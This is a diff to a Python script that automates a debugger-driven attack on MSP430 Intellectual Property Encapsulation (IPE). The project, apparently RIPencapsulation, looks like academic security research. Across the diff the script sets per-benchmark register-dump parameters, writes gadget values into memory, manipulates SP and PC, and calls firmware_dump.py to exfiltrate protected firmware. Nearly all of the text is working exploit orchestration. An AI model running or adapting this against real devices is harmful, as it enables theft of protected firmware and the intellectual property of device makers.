@@ -12,16 +12,24 @@ benchmark = "aes"
 #benchmark = "sha-saddi"
 #benchmark = "sha-gladman"
 
+#reg_dump_size and reg_dump_sleep_time might differ for other opt levels,
+#the current values are set for -O0 optimization level
 if(benchmark == "aes"):
     BINARY_NAME = "~/RIPencapsulation/msp430/bin/aes-test.out"
-elif(becnhmark == "rsa"):
+    reg_dump_size = 200
+    reg_dump_sleep_time = 5
+elif(benchmark == "rsa"):
     BINARY_NAME = "~/RIPencapsulation/msp430/bin/rsa-test.out"
-elif(becnhmark == "sha-saddi"):
+    reg_dump_size = 400
+    reg_dump_sleep_time = 5
+elif(benchmark == "sha-saddi"):
     BINARY_NAME = "~/RIPencapsulation/msp430/bin/sha-saddi-test.out"
-elif(becnhmark == "sha-gladman"):
+    reg_dump_size = 700
+    reg_dump_sleep_time = 10
+elif(benchmark == "sha-gladman"):
     BINARY_NAME = "~/RIPencapsulation/msp430/bin/sha-gladman-test.out"
-    
-reg_dump_size = 200 
+    reg_dump_size = 5000
+    reg_dump_sleep_time = 60
 
 os.system('dss.sh ~/RIPencapsulation/eval/javascript/remove_ipe.js')
 
@@ -34,13 +42,13 @@ subprocess.Popen(["python3","register_dump.py",str(reg_dump_size),"register_stat
 time.sleep(1)
 
 sendCmdWaitBusy(proc, "run", VERBOSE)
-time.sleep(5)
+time.sleep(reg_dump_sleep_time)
 sendCmdWaitReady(proc, "\\break", VERBOSE)
 
-subprocess.Popen(["python3","guess_indirect_loads.py"])
+subprocess.Popen(["python3","guess_indirect_loads.py", benchmark])
 time.sleep(5)
 
-sendCmdWaitReady(proc, "mw COMPARE_VALUE 0x1b", VERBOSE)
+sendCmdWaitReady(proc, "mw COMPARE_VALUE 0x1a", VERBOSE)
 sendCmdWaitReady(proc, "mw COMPARE_VALUE+1 0x00", VERBOSE)
 sendCmdWaitReady(proc, "mw IOP_gadget 0x40", VERBOSE)
 sendCmdWaitReady(proc, "mw increment_timer_count 0x03", VERBOSE)
@@ -118,7 +126,7 @@ if(indirect_load == 1):
     sendCmdWaitReady(proc, "set SP 0x2bfc", VERBOSE)
     sendCmdWaitReady(proc, "set PC main", VERBOSE)
     print("\nExfiltrating IPE Firmware ...")
-    subprocess.Popen(["python3","firmware_dump.py","8192",str(reg_count),str(dest_reg-1),"2"])
+    subprocess.Popen(["python3","firmware_dump.py","8192",str(reg_count),str(dest_reg-1),"b"])
     time.sleep(1)
     sendCmdWaitBusy(proc, "run", VERBOSE)
 elif(indirect_load == 2):
@@ -133,7 +141,7 @@ elif(indirect_load == 2):
     sendCmdWaitReady(proc, "set SP 0x2bfc", VERBOSE)
     sendCmdWaitReady(proc, "set PC main", VERBOSE)
     print("\nExfiltrating IPE Firmware ...")
-    subprocess.Popen(["python3","firmware_dump.py","4096",str(reg_count),str(dest_reg-1),"0"])
+    subprocess.Popen(["python3","firmware_dump.py","4096",str(reg_count),str(dest_reg-1),"w"])
     time.sleep(1)
     sendCmdWaitBusy(proc, "run", VERBOSE)
 else:
